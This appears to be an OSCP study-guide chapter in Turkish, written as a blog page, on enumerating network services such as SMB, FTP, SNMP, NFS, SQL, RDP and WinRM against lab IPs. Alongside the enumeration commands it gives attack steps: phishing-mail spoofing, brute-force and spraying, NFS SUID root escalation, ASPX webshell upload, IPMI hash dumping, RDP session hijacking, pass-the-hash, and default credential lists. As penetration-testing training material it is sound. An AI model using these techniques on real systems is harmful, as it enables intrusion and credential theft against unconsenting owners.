---
title: "Bölüm 11 — Servis & Protokol Enumerasyonu"
date: 2026-10-22 07:00:00 +0300
categories: [OSCP, Enumerasyon]
tags: [enumeration, smb, ftp, snmp, mssql, rdp, winrm]
oscp: true
toc: true
permalink: /oscp/11-servis-enumerasyon/
---
{% raw %}
Bu bölüm, [Bölüm 1](/oscp/01-enumerasyon/)'deki port taramasından sonra gelen
**servis bazlı derin enum** katmanıdır. Kural: **açık her port bir hikâye
anlatır — versiyon, yanlış yapılandırma ve kimlik bilgisi için her servisi tek
tek konuş.** Anonim/null erişim, default credential ve okunabilir paylaşım, ilk
erişimin en sık kaynağıdır; exploit aramadan önce bunları tüket.

Her servis için akış aynı: **port doğrula → versiyon/banner al → NSE/araçla enum
→ anonim/default dene → kimlik bilgisi bulduysan tekrar enum.**

## 11.1 FTP / TFTP (21/tcp, 69/udp)

```bash
# Versiyon + default NSE (ftp-anon anonim erişimi, ftp-syst STAT bilgisini verir)
sudo nmap -sV -p21 -sC -A 10.129.14.136
sudo nmap -p21 --script ftp-anon,ftp-syst,ftp-bounce 10.129.14.136 --script-trace

# Anonim login
ftp 10.129.14.136        # kullanıcı: anonymous  parola: (boş) veya anonymous
#  ls -la   → gizli dosyalar     ls -R → recursive listeleme (ls_recurse_enable açıksa)
#  binary   → ikili dosya modu (indirmeden önce)
#  !<cmd>   → yerel komut çalıştır (bağlantı kopmaz)

# Tüm içeriği topluca çek (anonim)
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

# TLS/SSL ile çalışan FTP (sertifika da görülür)
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

**Tehlikeli ayarlar (vsftpd.conf):** `anonymous_enable=YES`, `anon_upload_enable=YES`,
`anon_mkdir_write_enable=YES`, `write_enable=YES`. Anonim **yazma** varsa web root'a
webshell atma veya LFI/log-poison zinciri düşün. **TFTP (69/udp)** kimlik doğrulaması
yoktur, UDP'dir; sadece `get`/`put` ile global okunabilir dosyalara erişilir.

## 11.2 SMB / Samba / RPC (139/tcp, 445/tcp)

```bash
# Versiyon + geniş NSE
sudo nmap -sV -sC -p139,445 --script "smb-* and not brute" 10.129.14.128

# Paylaşım listesi (anonim / null)
smbclient -N -L //10.129.14.128                 # null session share listesi
smbclient -N //10.129.14.128/ShareName          # paylaşıma bağlan
smbmap -H 10.129.14.128                          # share + izinler (READ/WRITE)
smbmap -H 10.129.14.128 -u guest                 # guest ile
smbmap -H 10.129.14.128 -u user -p pass -R Share # içeriği recursive gez

# netexec (cme) — hızlı durum + enum
netexec smb 10.129.14.128 -u '' -p '' --shares
netexec smb 10.129.14.128 -u user -p pass --users --groups --shares

# enum4linux-ng (kullanıcı, grup, paylaşım, OS, parola politikası)
enum4linux-ng -A 10.129.14.128
```

**rpcclient (null session):**

```bash
rpcclient -U "" -N 10.129.14.128
#  srvinfo            → OS / sunucu bilgisi
#  enumdomains        → domainler
#  querydominfo       → domain özeti + parola politikası
#  netshareenumall    → tüm paylaşımlar
#  netsharegetinfo X  → belirli paylaşım bilgisi
#  enumdomusers       → domain kullanıcıları (RID'lerle)
#  queryuser 0x1f4    → RID'den kullanıcı detayı

# RID brute (kullanıcı adı keşfi) — null erişim yeterli
for i in $(seq 500 1100); do \
  rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x' $i)" \
  | grep "User Name\|user_rid\|group_rid"; done
samrdump.py 10.129.14.128                         # impacket ile RID→kullanıcı
```

**Paylaşımda kimlik bilgisi avı (bağlandıktan sonra):**

```bash
# Windows tarafı
net use n: \\10.129.14.128\Finance /user:plaintext Password123
dir n:\*cred* /s /b                               # isimde cred geçen dosyalar
findstr /s /i cred n:\*.*                          # içerikte cred araması
# PowerShell
New-PSDrive -Name N -Root \\10.129.14.128\Finance -PSProvider FileSystem
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
Get-ChildItem -Recurse -Path N:\ | Select-String "password" -List

# Linux tarafı: mount edip find/grep
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. \
  //10.129.14.128/Finance /mnt/Finance
grep -riE 'pass|cred|secret' /mnt/Finance
```

> SMB **saldırı** tarafı (ele geçirme, exec) için bkz. [Bölüm 7 — PsExec/WMI/WinRM](/oscp/07-ad-saldirilari/).

## 11.3 DNS (53/tcp+udp)

```bash
# NS / kayıt sorguları (@ ile hedef DNS'i seç)
dig ns inlanefreight.htb @10.129.14.128
dig any inlanefreight.htb @10.129.14.128
dig soa inlanefreight.htb @10.129.14.128          # yönetici e-postası (. → @)
dig CH TXT version.bind @10.129.14.128            # sürüm (varsa)

# Zone transfer (AXFR) — allow-transfer any/subnet ise iç host/IP sızar
dig axfr inlanefreight.htb @10.129.14.128

# Subdomain brute
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 \
  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
for s in $(cat subdomains.txt); do \
  dig $s.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | grep $s; done
```

**Tehlikeli ayarlar:** `allow-transfer { any; }` → AXFR ile tüm zone (iç IP/hostname)
dışarı sızar. CNAME başka (süresi dolmuş) domaine işaret ediyorsa → **subdomain
takeover**.

## 11.4 SMTP (25/tcp, 465/587)

```bash
sudo nmap -p25,465,587 -sCV --script smtp-* 10.129.14.128

# Manuel: kullanıcı doğrulama (VRFY/EXPN/RCPT)
telnet 10.129.14.128 25
#  EHLO x               → desteklenen uzantılar
#  VRFY root            → 252/250 = var,  550 = yok
#  EXPN support-team    → dağıtım listesindeki üyeleri açar
#  MAIL FROM:<a@b> + RCPT TO:<user>  → 250 ok = kullanıcı var

# Otomatik kullanıcı enum
smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t 10.129.14.128
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.129.14.128

# Open relay testi + istismar (phishing/spoof)
sudo nmap -p25 -Pn --script smtp-open-relay 10.129.14.128
swaks --from notifications@inlanefreight.com --to victim@inlanefreight.com \
  --header 'Subject: Notification' --body 'http://phish/' --server 10.129.14.128
```

> Mail servisine brute için: `hydra -L users.txt -p 'Company01!' smtp://10.129.14.128`.
> **Not:** mail brute'da kullanıcıya `@domain.com` eklemeyi unutma.

## 11.5 IMAP / POP3 (143/993, 110/995)

```bash
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
openssl s_client -connect 10.129.14.128:pop3s     # 995 TLS
openssl s_client -connect 10.129.14.128:imaps      # 993 TLS

# curl ile hızlı posta okuma (kimlik bilgisi varsa)
curl -k 'imaps://10.129.14.128/INBOX?ALL' --user user:'P4ssw0rd!'
curl -k 'imaps://10.129.14.128/INBOX;UID=1' --user user:'P4ssw0rd!'
```

**IMAP manuel (her komutun başına `a`/`b`/`c` gibi etiket koy):**

```text
a LOGIN user pass
b LIST "" *                 → tüm klasörler
b SELECT INBOX              → "N EXISTS" satırı posta sayısını verir
c FETCH 1 (FLAGS BODY[])    → postayı oku
```

**POP3 manuel:** `USER john` → `+OK` kullanıcı var / `-ERR` yok; `PASS x` → `LIST` →
`RETR 1`. Brute: `hydra -l user -P pass.list pop3://10.129.14.128 -t 16`.

## 11.6 SNMP (161/udp, 162/udp trap)

```bash
# Community string brute (v1/v2c default: public/private)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

# Walk — community bulununca tüm OID ağacını çek
snmpwalk -v2c -c public 10.129.14.128
snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.2.1.25.4.2.1.2   # çalışan süreçler
snmpwalk -v2c -c public 10.129.14.128 nsExtendObjects         # komut çıktıları

# OID brute (community biliniyorsa)
braa public@10.129.14.128:.1.3.6.*
```

**Tehlikeli ayarlar:** `rwcommunity`/`rwuser noauth` → kimlik doğrulamasız tam OID
ağacı. SNMP v1/v2c community **plaintext** gider; süreç satırlarında parola/komut
sızıntısı sık görülür.

## 11.7 NFS (111/tcp+udp, 2049)

```bash
sudo nmap --script nfs* -sV -p111,2049 10.129.14.128
showmount -e 10.129.14.128                         # export edilen paylaşımlar

# Mount + içerik (başka ağdaysan mount olmaz)
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
ls -l  target-NFS/mnt/nfs/        # kullanıcı/grup adlarıyla
ls -n  target-NFS/mnt/nfs/        # UID/GID ile
sudo umount ./target-NFS
```

**no_root_squash istismarı:** export `no_root_squash` ile ise, Kali'de root olarak
paylaşıma SUID bir binary koy (`cp /bin/bash .; chmod +s bash`), hedefte normal
kullanıcı ile `./bash -p` → root. UID eşleşmesi gerekiyorsa hedefteki dosya
sahibinin UID'siyle Kali'de kullanıcı oluştur.

## 11.8 MySQL / MSSQL (3306 / 1433)

```bash
# --- MySQL (3306) ---
sudo nmap -sV -p3306 --script mysql-* 10.129.14.128
mysql -u root -p'' -h 10.129.14.128                # boş/zayıf parola dene
#  show databases;  use db;  show tables;  select * from users;
#  select version();  select @@secure_file_priv;   → dosya okuma/yazma sınırı

# --- MSSQL (1433) ---
sudo nmap -p1433 -sV --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,\
ms-sql-xp-cmdshell,ms-sql-config,ms-sql-tables,ms-sql-hasdbaccess \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password= 10.129.14.128

impacket-mssqlclient Administrator@10.129.14.128 -windows-auth    # AD hesabıyla
sqsh -S 10.129.14.128 -U sa -P 'Password123'                      # Linux istemci
#  SELECT name FROM sys.databases;
#  SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';
```

> MSSQL `xp_cmdshell` ile komut çalıştırma ve `INTO OUTFILE`/`INTO DUMPFILE` ile
> webshell için bkz. [Bölüm 2 — SQLi](/oscp/02-web-saldirilari/) ve
> [Bölüm 10 — Vakalar](/oscp/10-vakalar/).

## 11.9 Oracle TNS (1521/tcp)

```bash
# SID brute — bağlanmak için SID şart
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
./odat.py all -s 10.129.204.235                    # ODAT ile tam enum/istismar

# Bağlan (default cred: scott/tiger, Oracle9: CHANGE_ON_INSTALL, dbsnmp/dbsnmp)
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba    # yüksek yetki
#  select table_name from all_tables;
#  select * from user_role_privs;
#  select name, password from sys.user$;           → hash'leri çek, offline kır

# Dosya yükleme (sysdba ile web root'a webshell) → RCE
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba \
  --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx
```

## 11.10 IPMI / BMC (623/udp)

```bash
sudo nmap -sU --script ipmi-version -p623 10.129.14.128
msf6 > use auxiliary/scanner/ipmi/ipmi_version

# RAKP zafiyeti: kimlik doğrulamadan ÖNCE parola hash'i alınır → offline kır
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u   # HP iLO 8 karakter maske
```

**Default credential** (ilk deneyecekler): Dell iDRAC `root:calvin`, Supermicro
`ADMIN:ADMIN`, HP iLO `Administrator:<8 karakter>`. BMC erişimi ≈ fiziksel erişim.

## 11.11 SSH & Rsync (22 / 873)

```bash
# SSH enum
ssh-audit 10.129.14.132
ssh -v user@10.129.14.132                           # banner / auth yöntemleri
ssh -v user@10.129.14.132 -o PreferredAuthentications=password   # brute öncesi

# Rsync (873) — çoğu zaman anonim listelenir
nc -nv 10.129.14.132 873                             # @RSYNCD banner, #list
rsync -av --list-only rsync://10.129.14.132/dev      # modül içeriği
rsync -av rsync://10.129.14.132/dev ./loot           # dosyaları çek (SSH key avı!)
rsync -av -e "ssh -p2222" user@10.129.14.132:/path . # SSH üzerinden
```

**Tehlikeli SSH ayarları:** `PermitRootLogin yes`, `PermitEmptyPasswords yes`,
`PasswordAuthentication yes` (brute açık). Rsync paylaşımında `.ssh/` görünüyorsa
private key çekip doğrudan giriş dene.

## 11.12 RDP (3389/tcp)

```bash
nmap -sV -sC -p3389 --script rdp* 10.129.201.248
./rdp-sec-check.pl 10.129.201.248                   # şifreleme/NLA zayıflığı

# Password spray / login
hydra -L users.txt -p 'Password123!' 10.129.201.248 rdp
xfreerdp /u:user /p:'P455w0rd!' /v:10.129.201.248   # Kali'den GUI
rdesktop -u admin -p password123 10.129.201.248
```

**RDP session hijacking (SYSTEM gerekir):**

```text
C:\> query user                                     # aktif sessionları gör
C:\> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
C:\> net start sessionhijack                        # hedef session'a parolasız bağlan
```

> Server 2019'da artık çalışmaz. Restricted Admin ile Pass-the-Hash için:
> `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`.

## 11.13 WinRM (5985/5986)

```bash
nmap -p5985,5986 -sV 10.129.201.248
netexec winrm 10.129.201.248 -u user -p pass        # erişim doğrulama (Pwn3d!)
evil-winrm -i 10.129.201.248 -u Administrator -p 'P455w0rD!'
evil-winrm -i 10.129.201.248 -u Administrator -H <NTLM_HASH>   # pass-the-hash
```

## 11.14 Enum → Plan Dönüşümü

Her servisten çıkan sonucu üç kutuya yaz: **(1) kimlik bilgisi** (default/anonim/dosyada),
**(2) sürüm → bilinen exploit**, **(3) okunabilir/yazılabilir yüzey** (share, NFS,
FTP, DB `OUTFILE`). Credential buldun mu → her serviste **tekrar** dene (parola
tekrarı kuraldır) ve [Bölüm 3](/oscp/03-parola-saldirilari/) ile spray/crack yap.
Web servisi çıktıysa [Bölüm 2](/oscp/02-web-saldirilari/) ve
[Bölüm 14](/oscp/14-yaygin-uygulamalar/)'e, AD ortamıysa
[Bölüm 6](/oscp/06-ad-enumerasyon/)'ya geç.

---

[← Bölüm 10](/oscp/10-vakalar/) · [Bölüm 12 →](/oscp/12-dosya-transferi/)
{% endraw %}
